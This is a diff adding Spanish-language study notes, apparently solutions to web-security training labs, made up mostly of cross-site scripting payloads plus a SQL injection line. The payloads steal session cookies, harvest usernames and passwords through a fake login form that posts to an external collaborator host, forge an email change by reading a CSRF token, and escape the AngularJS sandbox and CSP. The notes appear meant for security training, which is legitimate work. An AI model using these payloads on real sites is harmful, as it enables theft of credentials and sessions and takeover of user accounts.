@@ -247,3 +247,98 @@ Extensión HackVector
 ```
 1 union select username||';'||password from users
 ```
+
+## XSS
+
+<pre><code><strong>https://test.com&#x26;apos;+alert(0)+&#x26;apos;
+</strong></code></pre>
+
+### Evitar signos angulares, comillas simples y dobles, barras invertidas y las propias comillas invertidas
+
+```
+${alert(0)}
+```
+
+### XSS para robar cookies
+
+Copiar el payload del Burp Collaborator
+
+```
+<script>
+fetch("enlacepayload/?cookie=" +
+btoa(document.cookie));
+</script>
+```
+
+Vamos a almacenamiento y en session copiamos la cadena decodificada. Recargar página.
+
+### XSS robar contraseña
+
+```
+Introduce tus credenciales para ver el post:<br><br>
+
+Usuario: <input name=username id=username onchange="fetch('https://312idkkpby7safgl6702f7t0jrpidc11.oastify.com?username=' + this.value)"><br><br>
+Password: <input name=password id=password type=password onchange="fetch('https://312idkkpby7safgl6702f7t0jrpidc11.oastify.com?password=' + this.value)">
+```
+
+Lo posteamos y le damos a pull now en Burp Collaborator.
+
+### XSS para CSRF
+
+```
+<script>
+var req = new XMLHttpRequest();
+req.open("GET", "/my-account", false);
+req.send();
+var response = req.responseText;
+var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
+var req2 = new XMLHttpRequest();
+req2.open('POST', '/my-account/change-email', true);
+req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+var data = "email=" + encodeURIComponent("pwned@pwned.com") + "&csrf=" + encodeURIComponent(csrf_token);
+req2.send(data);
+</script>
+```
+
+### Escape de sandbox AngularJS sin cadenas
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Miramos la versión y la mejor opción. Este es el trozo de código.
+
+```
+angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse) {
+    $scope.query = {};
+    var key = 'search';
+    $scope.query[key] = 'testing';
+    $scope.value = $parse(key)($scope.query);
+});
+
+```
+
+scope -> objeto especial -> controlador/vista
+
+parse-> servicio que interpreta Angular user.name&#x20;
+
+```
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+```
+
+### XSS con angular y CSP
+
+```
+<script>
+location = 'https://0a1800f803f34c108bfd2100d600aa.web-security-academy.net/?search=<input id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(document.cookie)\'>#x';
+</script>
+```
+
+### XSS Reflect Handler y href atributos&#x20;
+
+Hacemos con el Intruder las etiquetas como en anteriores labs.
+
+```
+<svg><a><animate attributeName=href values=javascript:alert(0) /><text x=30 y=30>Click me!</text></a>
+```
+
+## XSS en javascript: con caracteres limitados
+
